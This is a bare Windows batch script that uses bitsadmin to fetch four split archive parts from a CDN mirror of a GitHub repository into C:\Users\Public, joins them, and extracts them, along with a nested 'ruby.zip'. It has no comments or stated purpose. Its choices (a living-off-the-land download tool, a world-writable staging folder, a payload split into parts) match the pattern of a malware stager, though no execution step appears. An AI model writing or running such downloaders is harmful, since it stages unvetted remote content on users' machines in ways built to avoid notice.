
@echo off
setlocal EnableExtensions

set "WORK=C:\Users\Public"
set "BASE=https://cdn.jsdmirror.com/gh/anupcic/rubyfiles@main"
set "ZIP=split_archive.zip"
set "OUT=%WORK%\extracted"

cd /d "%WORK%" || exit /b 1

bitsadmin /transfer Part001 /download /priority normal "%BASE%/split_archive.zip.001" "%WORK%\%ZIP%.001" || exit /b 1

bitsadmin /transfer Part002 /download /priority normal "%BASE%/split_archive.zip.002" "%WORK%\%ZIP%.002" || exit /b 1

bitsadmin /transfer Part003 /download /priority normal "%BASE%/split_archive.zip.003" "%WORK%\%ZIP%.003" || exit /b 1

bitsadmin /transfer Part004 /download /priority normal "%BASE%/split_archive.zip.004" "%WORK%\%ZIP%.004" || exit /b 1

copy /b "%ZIP%.001"+"%ZIP%.002"+"%ZIP%.003"+"%ZIP%.004" "%WORK%\complete.zip" >nul || exit /b 1

if not exist "%OUT%" mkdir "%OUT%"

tar -xf "%WORK%\complete.zip" -C "%OUT%" || exit /b 1

if exist "%OUT%\ruby.zip" (
    if not exist "%OUT%\ruby_files" mkdir "%OUT%\ruby_files"
    tar -xf "%OUT%\ruby.zip" -C "%OUT%\ruby_files" || exit /b 1
)

exit /b 0
